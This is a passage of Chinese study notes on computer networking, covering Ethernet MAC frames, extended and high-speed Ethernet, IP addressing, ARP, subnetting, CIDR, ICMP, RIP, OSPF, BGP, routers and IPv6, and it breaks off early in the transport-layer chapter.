时，地址段表示单个站地址；I/G 位为 1 时表示组地址，用来多播</li><li>IEEE 规定地址字段第一字节的最低第二位为 G/L 位：G/L 位为 0 时是全球管理，为 1 时是本地管理</li><li>适配器由过滤功能，从网络上每收到一个 MAC 帧就先用硬件检查 MAC 帧中的目的地址。</li><li>发往本站的帧：单播帧，广播帧，多播帧</li><li>所有的适配器都至少能够识别前两种帧，即能够识别单播地址和广播地址。</li><li>有的适配器可用编程方法识别多播地址。</li><li>只有目的地址才能使用广播地址和多播地址。</li><li>以混杂方式 (promiscuous mode) 工作的以太网适配器只要“听到”有帧在以太网上传输就都接收下来。</li></ul></li><li><p>MAC 帧的格式</p><ul><li>最常用的 MAC 帧是以太网 V2 格式</li><li>最后一字段是 4 字节的帧检验序列 FCS（使用 CRC 检验）</li><li>无效的 MAC 帧：<ul><li>长度不是整数个字节</li><li>收到的 FCS 帧检验序列查出错误</li><li>数据位置错误</li></ul></li></ul></li></ol><h2 id="3-4-扩展的以太网"><a href="#3-4-扩展的以太网" class="headerlink" title="3.4 扩展的以太网"></a>3.4 扩展的以太网</h2><h3 id="3-4-1-在物理层扩展以太网"><a href="#3-4-1-在物理层扩展以太网" class="headerlink" title="3.4.1 在物理层扩展以太网"></a>3.4.1 在物理层扩展以太网</h3><ol><li>使用光纤扩展</li><li>使用集线器扩展（碰撞域）<ul><li>优点<ul><li>（1）使原来属于不同碰撞域的以太网上的计算机能够进行跨碰撞域的通信。</li><li>（2）扩大了以太网覆盖的地理范围。</li></ul></li><li>缺点<ul><li>（1）碰撞域增大了，但总的吞吐量并未提高。</li><li>（2）如果不同的碰撞域使用不同的数据率，那么就不能用集线器将它们互连起来。</li></ul></li></ul></li></ol><h3 id="3-4-2-在数据链路层扩展以太网"><a href="#3-4-2-在数据链路层扩展以太网" class="headerlink" title="3.4.2 在数据链路层扩展以太网"></a>3.4.2 在数据链路层扩展以太网</h3><ul><li>早期使用网桥，现在使用以太网交换机</li></ul><ol><li><p>以太网交换机的特点</p><ul><li>实质上是一个多接口网桥</li><li>工作在全双工方式</li><li>相互通信的主机都是独占传输媒体，无碰撞地传输数据<ul><li>具有并行性，能使多对主机同时通信</li></ul></li><li>许多以太网交换机对收到的帧采用存储转发方式进行转发，但是也有一些交换机采用直通的交换方式</li></ul></li><li><p>以太网交换机的自学习功能</p><ul><li>即插即用，帧交换表</li></ul></li><li><p>从总线以太网到星形以太网</p><ul><li>仍然采用以太网的帧结构</li></ul></li></ol><h3 id="3-4-3-虚拟局域网"><a href="#3-4-3-虚拟局域网" class="headerlink" title="3.4.3 虚拟局域网"></a>3.4.3 虚拟局域网</h3><ul><li>虚拟局域网 VLAN 是由一些局域网网段构成的与物理位置无关的逻辑组，而这些网段具有某些共同的需求。每一个 VLAN 的帧都有一个明确的标识符，指明发送这个帧的计算机是属于哪一个 VLAN。</li><li>虚拟局域网其实只是局域网给的一种服务，而并不是一种新型局域网。</li></ul><h2 id="3-5-高速以太网"><a href="#3-5-高速以太网" class="headerlink" title="3.5 高速以太网"></a>3.5 高速以太网</h2><h3 id="3-5-1-100BASE-T-以太网"><a href="#3-5-1-100BASE-T-以太网" class="headerlink" title="3.5.1 100BASE-T 以太网"></a>3.5.1 100BASE-T 以太网</h3><ul><li>速率达到或超过 100Mbit/s 的以太网称为高速以太网</li><li>100BASE-T 以太网又叫快速以太网</li><li>可在全双工方式下工作而无冲突发生</li></ul><h3 id="3-5-2-吉比特以太网"><a href="#3-5-2-吉比特以太网" class="headerlink" title="3.5.2 吉比特以太网"></a>3.5.2 吉比特以太网</h3><ul><li>在半双工方式下使用 CSMA/CD 协议，全双工方式不使用 CSMA/CD 协议。</li><li>载波延伸</li><li>分组突发</li></ul><h3 id="3-5-3-10-吉比特以太网-10GE-和更快的以太网"><a href="#3-5-3-10-吉比特以太网-10GE-和更快的以太网" class="headerlink" title="3.5.3 10 吉比特以太网 (10GE) 和更快的以太网"></a>3.5.3 10 吉比特以太网 (10GE) 和更快的以太网</h3><ul><li>只工作在全双工方式</li></ul><h3 id="3-5-4-使用以太网进行宽带接入"><a href="#3-5-4-使用以太网进行宽带接入" class="headerlink" title="3.5.4 使用以太网进行宽带接入"></a>3.5.4 使用以太网进行宽带接入</h3><ul><li>可以提供双向的宽带通信。</li><li>可以根据用户对带宽的需求灵活地进行带宽升级。</li><li>可以实现端到端的以太网传输，中间不需要再进行帧格式的转换。这就提高了数据的传输效率且降低了传输的成本。</li><li>但是不支持用户身份鉴别。</li></ul><h1 id="第四章-网络层"><a href="#第四章-网络层" class="headerlink" title="第四章 网络层"></a>第四章 网络层</h1><h2 id="4-1-网络层提供的两种服务"><a href="#4-1-网络层提供的两种服务" class="headerlink" title="4.1 网络层提供的两种服务"></a>4.1 网络层提供的两种服务</h2><ul><li>面向连接还是无连接</li><li>互联网采用的设计思路是这样的：网络层向上只提供简单灵活的，无连接的，尽最大努力交付的数据报服务。</li><li>网络层不提供服务质量的承诺</li><li>通信之前先建立虚电路，以保证双方通信所需的一切网络资源。</li><li>虚电路表示这只是一条逻辑上的连接，分组都沿着这条逻辑连接按照存储转发方式传送</li></ul><h2 id="4-2-网际协议-IP"><a href="#4-2-网际协议-IP" class="headerlink" title="4.2 网际协议 IP"></a>4.2 网际协议 IP</h2><h3 id="4-2-1-虚拟互连网络"><a href="#4-2-1-虚拟互连网络" class="headerlink" title="4.2.1 虚拟互连网络"></a>4.2.1 虚拟互连网络</h3><ul><li>没有一种单一的网络能够适应所有用户的需求</li><li>将网络互相连接起来要使用一些中间设备：<ul><li>物理层中继系统：转发器 (repeater)。</li><li>数据链路层中继系统：网桥 或 桥接器 (bridge)。</li><li>网络层中继系统：路由器 (router)。</li><li>网桥和路由器的混合物：桥路器 (brouter)。</li><li>网络层以上的中继系统：网关 (gateway)。</li></ul></li><li>网络互连都是指用路由器进行网络互连和路由选择。</li><li>由于历史的原因，许多有关 TCP/IP 的文献将网络层使用的路由器称为网关。</li><li>所谓虚拟互连网络也就是逻辑互连网络，它的意思就是互连起来的各种物理网络的异构性本来是客观存在的，但是我们利用 IP 协议就可以使这些性能各异的网络从用户看起来好像是一个统一的网络。</li><li>使用 IP 协议的虚拟互连网络可简称为 IP 网。</li><li>使用虚拟互连网络的好处是：当互联网上的主机进行通信时，就好像在一个网络上通信一样，而看不见互连的各具体的网络异构细节。</li><li>如果在这种覆盖全球的 IP 网的上层使用 TCP 协议，那么就是现在的互联网 (Internet)。</li><li>互联网可以由多种异构网络互连组成</li></ul><h3 id="4-2-2-分类的-IP-地址"><a href="#4-2-2-分类的-IP-地址" class="headerlink" title="4.2.2 分类的 IP 地址"></a>4.2.2 分类的 IP 地址</h3><ol><li><p>IP 地址及其表示方法：</p><ul><li>整个互联网就是一个单一的，抽象的网络。IP 地址就是给互联网上的每一台主机（或路由器）的每一个接口分配一个全世界范围内是唯一的 32 位的标识符</li><li>IP 地址现在由互联网名字和数字分配机构 ICANN 进行分配</li><li>IP 地址的编制方法经过三个历史阶段：<ul><li>（1）分类的 IP 地址</li><li>（2）子网的划分</li><li>（3）构成超网</li></ul></li><li>分类的 IP 地址：就是将 IP 地址划分位若干个固定类。</li><li>A，B，C 类地址都是由两个固定长度的字段组成，其中第一个字段是网络号，是唯一的。第二个字段是主机号，在当前网络范围内是唯一的</li><li>由此可见，一个 IP 地址在整个互联网范围内是唯一的</li><li>A，B，C 类是单播地址，D 类地址用于多播，E 类地址保留</li><li>点分十进制记法</li></ul></li><li><p>常用的三种类别的 IP 地址</p><ul><li>A 类地址，网络号全 0 表示本网络，全 1 表示本地软件环回测试</li><li>A 类地址，主机号全 0 表示本主机连接的单个网络地址，全 1 表示该网络上所有的主机</li><li>一般不用的特殊的 IP</li><li>IP 地址的特点：<ul><li>（1）IP 是分等级的地址结构，IP 地址管理机构只分配网络号，主机号由得到网络号的单位自行分配，路由器仅根据目的主机网络号来转发分组，减小了路由表所占的存储空间以及查找路由表的时间</li><li>（2）IP 地址标志一台主机和一条链路的接口，当一台主机同时连接到两个网络上时，该主机就必须同时具有两个相应的 IP 地址，其网络号必须不同。这种主机也叫做多归属主机</li><li>（3）一个网络时指具有相同网络号 net-id 的主机的集合，故，用转发器或网桥连接起来的若干局域网仍是一个网络。具有不同网络号的局域网必须用路由器进行互连</li><li>（4）在 IP 地址中，所有分配到网络号的网络都是平等的</li></ul></li></ul></li></ol><h3 id="4-2-3-IP-地址与硬件地址"><a href="#4-2-3-IP-地址与硬件地址" class="headerlink" title="4.2.3 IP 地址与硬件地址"></a>4.2.3 IP 地址与硬件地址</h3><ul><li>区分 IP 地址与硬件地址：从层次上来看，物理地址是数据链路层和物理层使用的地址，而 IP 地址是网络层和以上各层使用的地址，是一种逻辑地址。</li><li>在发送数据时，数据从高层向下到低层，然后才到通信链路上传输。使用 IP 地址的 IP 数据报一旦交给了数据链路层，就被封装成 MAC 帧了。MAC 帧在传送时使用的源地址和目的地址都是硬件地址，这两个地址都写在 MAC 帧的头部。连接在通信链路上的设备在收到 MAC 帧时，根据 MAC 帧首部的硬件地址决定抛弃与否，只有在剥去 MAC 帧的首部和尾部后把 MAC 层的数据上交给网络层后，网络层才能在 IP 数据报的首部找到源 IP 地址和目的 IP 地址</li><li>注意：<ul><li>（1）在 IP 层抽象的互联网上只能看到 IP 数据报</li><li>（2）路由器只根据目的站的 IP 地址的网络号进行路由选择</li><li>（3）在局域网的链路层，只能看见 MAC 帧</li><li>（4）IP 层抽象的互联网频闭下层这些很复杂的细节。</li></ul></li></ul><h3 id="4-2-4-地址解析协议-ARP"><a href="#4-2-4-地址解析协议-ARP" class="headerlink" title="4.2.4 地址解析协议 ARP"></a>4.2.4 地址解析协议 ARP</h3><ul><li>ARP 常被划分为网络层的协议</li><li>ARP 协议的用途：为了从网络层使用的 IP 地址，解析出在数据链路层使用的硬件地址。</li><li>地址解析协议 ARP 解决这个问题的方法是在主机 ARP 高速缓存中存放一个从 IP 地址到硬件地址的映射表，并且这个映射表还经常动态更新</li><li>当主机 A 要向本局域网上的某台主机 B 发送 IP 数据报时，就先在其 ARP 高速缓存查看有无主机 B 的 IP 地址。如果有，查出硬件地址并写入 MAC 帧，如果没有，（1） ARP 在本局域网广播发送一个 ARP 请求分组（2）在本局域网的所有主机上运行的 ARP 进程都收到了请求分组（3）主机 B 的 IP 地址与请求分组中要查询的 IP 地址一致，收下这个请求分组，并向主机 A 发送 ARP 响应分组，同时在这个 ARP 响应分组中写入自己的硬件地址（4）主机 A 收到主机 B 的 ARP 分组后，就在其 ARP 高速缓存中写入主机 B 的 IP 地址到硬件地址的映射</li><li>每一个映射地址项目都设置生存时间</li><li>ARP 是解决同一个局域网上的主机或路由器的 IP 地址和硬件地址的映射问题</li><li>从 IP 地址到硬件地址的解析是自动进行的，主机的用户对这种地址解析过程是不知道的</li></ul><h3 id="4-2-5-IP-数据报的格式"><a href="#4-2-5-IP-数据报的格式" class="headerlink" title="4.2.5 IP 数据报的格式"></a>4.2.5 IP 数据报的格式</h3><ol><li><p>IP 数据报首部的固定部分中的各字段</p><ul><li>（1）版本</li><li>（2）首部长度</li><li>（3）区分服务</li><li>（4）总长度：指首部和数据之和的长度</li><li>（5）标识</li><li>（6）标志：占 3 位，最低位 MF；中间位 DF</li><li>（7）片偏移</li><li>（8）生存时间 TTL：跳数限制</li><li>（9）协议</li><li>（10）首部检验和：只检验数据报的首部，但不包括数据部分</li><li>（11）源地址</li><li>（12）目的地址</li></ul></li><li><p>IP 层转发分组的流程</p><ul><li>在互联网上转发分组时，是从一个路由器转发到下一个路由器</li><li>在路由表中，对每一条路由最主要的是以下两个信息：目的网络四肢，下一跳地址。</li><li>虽然互联网所有的分组转发都是基于目的主机所在的网络，但是存在着对特定的目的主机指明一个路由。这种路由叫做特定主机路由。</li><li>默认路由：减小路由表所占用的空间和搜索路由表所用的时间</li><li>分组转发算法：<ul><li>（1）从数据报首部提取目的主机 IP 地址 D，得到目的网络 N</li><li>（2）若 N 就是与此路由器直接相连的某个网络地址，则进行直接交付，否则执行（3）</li><li>（3）若路由表中有目的地址为 D 的特定主机路由，则把数据报传送给下一跳路由器，若无则（4）</li><li>（4）若路由器有到达网络 N 的路由，则把数据报传送给路由表中所指明的下一跳路由器，否则（5）</li><li>（5）若路由表中有一个默认路由，则把数据报传送给路由表中所指明的默认路由器，否者（6）</li><li>（6）报告转发分组失败</li></ul></li></ul></li></ol><h2 id="4-3-划分子网和构造超网"><a href="#4-3-划分子网和构造超网" class="headerlink" title="4.3 划分子网和构造超网"></a>4.3 划分子网和构造超网</h2><h3 id="4-3-1-划分子网"><a href="#4-3-1-划分子网" class="headerlink" title="4.3.1 划分子网"></a>4.3.1 划分子网</h3><ol><li><p>从两级 IP 地址到三级 IP 地址</p><ul><li>IP 地址设计不合理：<ul><li>（1）IP 地址空间的利用率有时很低</li><li>（2）给每个物理网络分配一个网络号会是路由表变得太大</li><li>（3）两级 IP 地址不够灵活</li></ul></li><li>为了解决上诉问题，IP 地址中又增加了“子网号字段”，使两级地址变成三级地址—-这种做法也叫划分子网或子网寻址或子网路由选择</li><li>划分子网的基本思路：<ul><li>（1）一个拥有许多物理网络的单位，可将所属的物理网络划分为若干各子网。划分子网纯属一个单位内部的事情。本网络以外的网络看不见这个网络是由多少各子网组成，因为其对外仍然表现为一个网络</li><li>（2）划分子网的方法是从网络的主机号借用若干位作为子网号，当然主机号也就减少了同样的位数，于是两级 IP 地址在本单位内就变成了三级 IP 地址，网络号，子网号和主机号</li><li>（3）凡是从其他网络发送来的 IP 数据报，仍是根据目的网络号找到路由器，此路由器收到 IP 数据报后，再按照目的网络号和子网号找到目的子网，把 IP 数据报交付目的主机</li></ul></li></ul></li><li><p>子网掩码</p><ul><li>从 IP 数据报的首部无法看出源主机或目的主机多连接的网络是否进行了子网的划分。因此使用子网掩码。</li><li>将子网掩码与收到的数据报的目的 IP 地址逐位相与，得到子网的网络地址</li><li>再路由器的路由表中也必须有子网掩码，如果一个网络不划分子网，那么该网络的子网掩码就使用默认子网掩码</li><li>子网掩码是一个网络或一个子网的重要属性</li><li>划分子网增加了灵活性，但却减少了能够连接在网络上的主机总机数</li><li>相同的 IP 地址和不同的子网掩码可以得到相同的网络地址</li></ul></li></ol><h3 id="4-3-2-使用子网时分组的转发"><a href="#4-3-2-使用子网时分组的转发" class="headerlink" title="4.3.2 使用子网时分组的转发"></a>4.3.2 使用子网时分组的转发</h3><ul><li>路由表中必须包含：目的网络四肢，子网掩码，下一跳地址</li><li>划分子网的情况下，路由器转发分组的算法:<ul><li>（1）从收到的 IP 数据报的首部提取目的 IP 地址 D</li><li>（2）先判断是否为直接交付，否则执行（3）</li><li>（3）若路由表中有目的地址为 D 的特定主机路由，则把数据报传送给路由器中所指明的下一跳路由器，否则执行（4）</li><li>（4）对路由表中的每一行，用其中的子网码和 D 逐位相“与”，其结果为 N。若 N 与该行的目的地址匹配，则把数据报传送给该行指明的下一跳路由器；否则执行（5）</li><li>（5）若路由器中有一个默认路由，则把数据报传送给路由表中所指明的默认路由器；否则执行（6）</li><li>（6）报告转发分组出错</li></ul></li></ul><h3 id="4-3-3-无分类编址-CIDR（构造超网）"><a href="#4-3-3-无分类编址-CIDR（构造超网）" class="headerlink" title="4.3.3 无分类编址 CIDR（构造超网）"></a>4.3.3 无分类编址 CIDR（构造超网）</h3><ol><li><p>网络前缀</p><ul><li>IPv4 地址空间不够，IPv6 出现</li><li>使用变长子网掩码 VLSM</li><li>无分类域间路由选择 CIDR：<ul><li>（1）消除了传统的 ABC 类地址以及划分子网的概念，更能有效的分配地址空间。CIDR 将地址空间分为前后两部分，前部分是网络前缀，用来指明网络，后面部分指明主机。CIDR 使用斜线记法，在 IP 地址后面加一斜线，后面写网络前缀所占的位数</li><li>（2）CIDR 把网络前缀都相同的连续的 IP 地址组成一个“CIDR 地址块”，CIDR 使用 32 为的地址掩码，例如：/20 地址块的地址掩码是：11111111 11111111 11110000 00000000（即斜线后的数字是地址掩码中 1 的个数）</li></ul></li><li>由于 CIDR 地址块中有很多地址，所以在路由表中就利用 CIDR 地址块来查找目的网络。这种地址的聚合常称为路由聚合。</li><li>除个别外，每一个 CIDR 地址块都包含了多个 C 类地址，这就是构成超网</li><li>网络前缀越短，其地址块中包含的地址数就越多</li></ul></li><li><p>最长前缀匹配</p><ul><li>在查找路由表时，应当从匹配结果中选择出具有最长网络前缀的路由。</li></ul></li><li><p>使用二叉线索查找路由表</p></li></ol><h2 id="4-4-网际控制报文协议-ICMP"><a href="#4-4-网际控制报文协议-ICMP" class="headerlink" title="4.4 网际控制报文协议 ICMP"></a>4.4 网际控制报文协议 ICMP</h2><h3 id="4-4-1-ICMP-报文的种类"><a href="#4-4-1-ICMP-报文的种类" class="headerlink" title="4.4.1 ICMP 报文的种类"></a>4.4.1 ICMP 报文的种类</h3><ul><li>为了更有效的转发 IP 数据报和提高交付成功的机会，在网际层使用了网际控制报文协议 ICMP</li><li>ICMP 允许主机或路由器报告差错情况和提供异常情况的报告</li></ul><h4 id="ICMP-报文的种类"><a href="#ICMP-报文的种类" class="headerlink" title="ICMP 报文的种类"></a>ICMP 报文的种类</h4><ul><li>ICMP 报文有两种，即 ICMP 差错报告报文，ICMP 询问报文</li></ul><h5 id="ICMP-差错报告报文的类型："><a href="#ICMP-差错报告报文的类型：" class="headerlink" title="ICMP 差错报告报文的类型："></a>ICMP 差错报告报文的类型：</h5><ul><li>（1）终点不可达</li><li>（2）时间超过</li><li>（3）参数问题</li><li>（4）改变路由（重定向）</li></ul><h5 id="ICMP-询问报文的类型："><a href="#ICMP-询问报文的类型：" class="headerlink" title="ICMP 询问报文的类型："></a>ICMP 询问报文的类型：</h5><ul><li>（1）回送请求和回答</li><li>（2）时间戳请求和回答</li></ul><h3 id="4-4-2-ICMP-的应用举例"><a href="#4-4-2-ICMP-的应用举例" class="headerlink" title="4.4.2 ICMP 的应用举例"></a>4.4.2 ICMP 的应用举例</h3><ul><li>ICMP 的一个重要应用就是分组间探测 PING，用来测试两台主机之间的连通性</li><li>ping 使用了 ICMP 回送请求与回送回答报文</li><li>traceroute/tracert</li></ul><h2 id="4-5-互联网的路由选择协议"><a href="#4-5-互联网的路由选择协议" class="headerlink" title="4.5 互联网的路由选择协议"></a>4.5 互联网的路由选择协议</h2><h3 id="4-5-1-有关路由选择协议的几个基本概念"><a href="#4-5-1-有关路由选择协议的几个基本概念" class="headerlink" title="4.5.1 有关路由选择协议的几个基本概念"></a>4.5.1 有关路由选择协议的几个基本概念</h3><ol><li><p>理想的路由算法</p><ul><li>（1）算法必须是正确的和完整的</li><li>（2）算法在计算上应简单</li><li>（3）算法应能适应通信量和网络拓扑的变化</li><li>（4）算法应具有稳定性</li><li>（5）算法应是公平的</li><li>（6）算法应是最佳的</li></ul></li><li><p>分层次的路由选择协议</p><ul><li>互联网采用的路由选择协议主要是自适应，分布式路由选择协议</li><li>自治系统 AS：在单一技术管理下的一组路由器，这些路由器使用一种自治系统内部的路由选择协议和共同的度量。</li><li>一个 AS 对外的其他 AS 表现出的是一个单一的和一致的路由选择策略</li><li>互联网把路由选择协议划分为两大类：<ul><li>内部网关协议 IGP（AS 内部）：包括 RIP，OSPF</li><li>外部网关协议 EGP（AS 之间）：例如：BGP</li></ul></li></ul></li></ol><h3 id="4-5-2-内部网关协议-RIP"><a href="#4-5-2-内部网关协议-RIP" class="headerlink" title="4.5.2 内部网关协议 RIP"></a>4.5.2 内部网关协议 RIP</h3><ol><li><p>工作原理：</p><ul><li>RIP 是一种分布式的基于距离向量的路由选择协议</li><li>RIP 协议要求网络中的每一个路由器都要维护从它自己到其他每一各目的网络的“距离记录”：<ul><li>从一路由器到直接连接的网络的距离定义为 1</li><li>从一路由器到非直接连接的网络的距离定义为所经过的路由器数加 1</li><li>RIP 协议的“距离”也称为“跳数”，只适用于小型的互联网</li></ul></li><li>RIP 协议的特点：<ul><li>（1）仅和相邻路由器交换信息</li><li>（2）路由器交换的信息是当前本路由器所知道的全部信息，即自己现在的路由表</li><li>（3）按固定的时间间隔交换路由信息</li></ul></li><li>路由器再刚刚开始工作时，它的路由表是空的，然后路由器就得出到直接相连的几个网络的距离。接着每一个路由器也只和数目非常有限的相邻路由器交换，并更新路由信息</li><li>“收敛”：在自治系统中所有的结点都得到正确的路由选择信息的过程</li><li>路由表更新的言责是找出到每一个目的网络的最短距离。这种更新算法又称为距离向量算法。</li></ul></li><li><p>距离向量算法</p><ul><li>路由器收到相邻路由器（其地址为 X）的一个 RIP 报文：<ul><li>（1）先修改此 RIP 报文中的所有项目：把“下一跳”字段中的地址都改为 X，并把所有的“距离”字段的值加 1。</li><li>（2）对修改后的 RIP 报文中的每一个项目，重复以下步骤：<ul><li>若项目中的目的网络不在路由表中，则把该项目加到路由表中。</li><li>否则<ul><li>若下一跳字段给出的路由器地址是同样的，则把收到的项目替换原路由表中的项目。</li><li>否则<ul><li>若收到项目中的距离小于路由表中的距离，则进行更新，</li></ul></li></ul></li><li>否则，什么也不做。</li></ul></li><li>（3）若 3 分钟还没有收到相邻路由器的更新路由表，则把此相邻路由器记为不可达路由器，即将距离置为 16（表示不可达）。</li><li>（4）返回。</li></ul></li><li>问题：当网络出现故障时，要经过比较长度的时间才能将此信息传送到所有的路由器</li><li>特点：好消息传播的快，坏消息传播的慢</li><li>优点：是实现简单，开销较小</li></ul></li><li><p>RIP 协议的报文格式</p><ul><li>RIP 协议使用运输层的用户数据报 UDP 进行传送</li><li>RIP 报文由首部和路由部分组成</li></ul></li></ol><h3 id="4-5-3-内部网关协议-OSPF"><a href="#4-5-3-内部网关协议-OSPF" class="headerlink" title="4.5.3 内部网关协议 OSPF"></a>4.5.3 内部网关协议 OSPF</h3><ol><li><p>OSPF 协议的基本特点：</p><ul><li>开放最短路径优先 OSPF：使用了 Dijkstra 提出的最短路径算法 SPF</li><li>OSPF 只是一个协议的名字，它并不表示其他的路由选择协议不是“最短路径优先”</li><li>OSPF 最主要的特征是使用分布式的链路状态协议<ul><li>（1）向本自治系统中所有路由器发送信息，洪泛法（RIP 只相自己相邻的路由器发送信息）</li><li>（2）发送的信息就是与本路由器相邻的所有路由器的链路状态（与哪些路由器相邻 + 度量）</li><li>（3）只有当链路状态发生变化时，路由器才向所有路由器用洪泛法发送此信息</li></ul></li><li>所有的路由器最终都能建立一个链路状态数据库，这个数据库实际上就是全网的拓扑结构图，这个拓扑结构图在全网范围内是一致的（链路状态数据库的同步）</li><li>OSPF 的更新过程收敛快—-优点</li><li>OSPF 将一个自治系统划分为若干个区域</li><li>主干区域，区域边界路由器（R3，R4，R7），主干路由器（R3，R4，R5，R6，R7），自治系统边界路由器（R6）</li><li>OSPF 不用 UDP 而是直接用 IP 数据报传送</li><li>OSPF 首部各字段意义：<ul><li>（1）版本</li><li>（2）类型</li><li>（3）分组长度</li><li>（4）路由器标识符</li><li>（5）区域标识符</li><li>（6）检验和</li><li>（7）鉴别类型</li><li>（8）鉴别</li></ul></li><li>OSPF 的特点：<ul><li>（1）OSPF 对于不同类型的业务看计算出不同的路由</li><li>（2）负载平衡</li><li>（3）鉴别</li><li>（4）OSPF 支持 CIDR</li><li>（5）OSPF 让每一个链路状态带上序号，序号越大，状态越新</li></ul></li></ul></li><li><p>OSPF 的五种分组类型</p><ul><li>（1）类型 1，问候 (Hello) 分组。</li><li>（2）类型 2，数据库描述 (Database Description) 分组。</li><li>（3）类型 3，链路状态请求 (Link State Request) 分组。</li><li>（4）类型 4，链路状态更新 (Link State Update) 分组，用洪泛法对全网更新链路状态。</li><li>（5）类型 5，链路状态确认 (Link State Acknowledgment) 分组。</li><li>OSPF 采用的是可靠的洪泛法（收到更新分组后要发送确认）</li><li>OSPF 每隔一段时间要刷新一次数据库中的链路状态</li></ul></li><li><p>OSPF 采用的是可靠的洪泛法（收到更新分组后要发送确认）</p><ul><li>OSPF 每隔一段时间要刷新一次数据库中的链路状态</li><li>OSPF 协议对多点接入的局域网采用了指定的路由器的方法</li></ul></li></ol><h3 id="4-5-4-外部网关协议-BGP"><a href="#4-5-4-外部网关协议-BGP" class="headerlink" title="4.5.4 外部网关协议 BGP"></a>4.5.4 外部网关协议 BGP</h3><ul><li>内部网关协议主要是设法使数据报在 AS 中尽可能有效地从源站传送到目的站</li><li>使用 BGP 的原因：<ul><li>（1）互联网的规模太大，使得自治系统 AS 之间路由选择非常困难</li><li>（2）自治系统 AS 之间的路由选择必须考虑有关策略</li></ul></li><li>边界网关协议 BGP 只能是力求寻找一条能够到达目的网络且比较好 的路由，而并非要寻找一条最佳路由</li><li>BGP 采用了路径向量路由选择协议</li><li>BGP 发言人与其他 AS 的 BGP 发言人要交换路由信息，就要先建立 TCP 连接，然后在此连接上交换 BGP 报文以建立 BGP 会话，利用 BGP 会话交换路由信息。</li><li>使用 TCP 连接交换路由信息的两个 BGP 发言人彼此成为对方发邻站或对等站</li><li>BGP 报文：OPEN，UPDATE，KEEPALIVE，NOTIFICATION</li></ul><h3 id="4-5-5-路由器的构成"><a href="#4-5-5-路由器的构成" class="headerlink" title="4.5.5 路由器的构成"></a>4.5.5 路由器的构成</h3><ol><li><p>路由器的结构</p><ul><li>路由器是一种具有多个输入端口和多个输出端口的专用计算机，其任务是转发分组，按照分组要去的目的地，从合适的端口转发给下一跳路由器。</li><li>路由器的转发分组正是网络层的主要工作</li><li>路由器结构划分为两大部分：<ul><li>（1）路由选择部分：控制部分，核心构件是路由选择处理机，任务：①根据路由选择协议构造路由表②不断更新和维护路由表</li><li>（2）分组转发部分：由三部分组成：交换结构，一组输入端口，一组输出端口，</li></ul></li><li>路由器的作用：连接不同的网络</li></ul></li><li><p>交换结构</p><ul><li>也叫（交换组织），作用：根据转发表对分组进行处理，从合适的端口转发出去。</li><li>路由表是根据路由选择算法得出，而转发表是从路由表得出的</li><li>输入端口中的查找和转发功能在路由器的交换功能中是最重要的。</li><li>路由器的端口收到分组时，就用中断方式通知路由选择处理机</li><li>路由器中的输入或输出队列产生溢出是造成分组丢失的重要原因。</li><li>通过存储器</li><li>通过总线</li><li>通过纵横交换结构</li></ul></li></ol><h2 id="4-6-IPv6"><a href="#4-6-IPv6" class="headerlink" title="4.6 IPv6"></a>4.6 IPv6</h2><ul><li>双栈协议：IPv4 向 IPv6 过渡</li><li>隧道技术</li></ul><h3 id="4-6-1-IPv6-的基本首部"><a href="#4-6-1-IPv6-的基本首部" class="headerlink" title="4.6.1 IPv6 的基本首部"></a>4.6.1 IPv6 的基本首部</h3><ul><li>变化：<ul><li>（1）更大的地址空间，128 位</li><li>（2）扩展的地址层次结构</li><li>（3）灵活的首部格式</li><li>（4）改进的选项</li><li>（5）允许协议继续扩充</li><li>（6）支持即插即用</li><li>（7）支持资源的预分配</li><li>（8）IPv6 首部改为 8 字节对齐</li></ul></li><li>IPv6 数据报由两大部分组成：基本首部和有效载荷（净负荷）</li><li>IPv6 把原来 IPv4 首部中选项的功能都放在扩展首部中，并将扩展首部留给路径两端的源站和目的站的主机来处理。</li><li>数据报途中经过的路由器都不处理这些扩展首部（只有一个首部例外，即逐跳选项扩展首部）。</li><li>这样就大大提高了路由器的处理效率。</li></ul><h3 id="4-6-2-IPv6-的地址"><a href="#4-6-2-IPv6-的地址" class="headerlink" title="4.6.2 IPv6 的地址"></a>4.6.2 IPv6 的地址</h3><ul><li>单播</li><li>多播</li><li>任播</li><li>IPv6 将实现 IPv6 的主机和路由器均称为结点。</li><li>一个结点就可能有多个与链路相连的接口。<ul><li>一个接口可以有多个单播地址。</li><li>其中的任何一个地址都可以作为到达该结点的目的地址。即一个结点接口的单播地址可用来唯一地标志该结点。</li></ul></li><li>为了使地址再稍简洁些，IPv6 使用冒号十六进制记法</li><li>冒号十六进制记法可以允许零压缩 (zero compression)，即一连串连续的零可以为一对冒号所取代。<ul><li>FF05:0:0:0:0:0:0:B3 可压缩为：</li><li>FF05::B3</li></ul></li><li>注意：在任一地址中只能使用一次零压缩。</li></ul><h2 id="4-7-多播"><a href="#4-7-多播" class="headerlink" title="4.7 多播"></a>4.7 多播</h2><h2 id="4-8-虚拟专用网和网络地址转换-NAT"><a href="#4-8-虚拟专用网和网络地址转换-NAT" class="headerlink" title="4.8 虚拟专用网和网络地址转换 NAT"></a>4.8 虚拟专用网和网络地址转换 NAT</h2><h2 id="4-9-多协议标记交换-MPLS"><a href="#4-9-多协议标记交换-MPLS" class="headerlink" title="4.9 多协议标记交换 MPLS"></a>4.9 多协议标记交换 MPLS</h2><h1 id="第五章-运输层"><a href="#第五章-运输层" class="headerlink" title="第五章 运输层"></a>第五章 运输层</h1><h2 id="5-1-运输层协议概述"><a href="#5-1-运输层协议概述" class="headerlink" title="5.1 运输层协议概述"></a>5.1 运输层协议概述</h2><h3 id="5-1-1-进程之间的通信"><a href="#5-1-1-进程之间的通信" class="headerlink" title="5.1.1 进程之间的通信"></a>5.1.1 进程之间的通信</h3><ul><li>运输层向它上面的应用层提供通信服务</li><li>它属于面向通信部分的最高层，同时也是用户功能的最低层</li><li>当网络的边缘部分中的两个主机使用网络的核心部分的功能进行端到端的通信时，只有位于网络边缘部分的主机的协议栈才有运输层，而网络核心部分中的路由器在转发分组时都只用到下三层的功能。</li><li>从 IP 层来说，通信的两端是两台主机，但是严格来说，真正进行通信的实体是在主机中的进程（运输层）</li><li>网络层是为主机之间提供逻辑通信，而运输层为应用进程之间提供端到端的逻辑通信</li><li>在一台主机中经常有多个应用进程同时分别和另一台主机中的多个应用进程通信。</li><li>这表明运输层有一个很重要的功能 —— 复用 (multiplexing) 和分用 (demultiplexing)。</li><li>根据应用程序的不同需求，运输层需要有两种不同的运输协议，即面向连接的 TCP 和无连接的 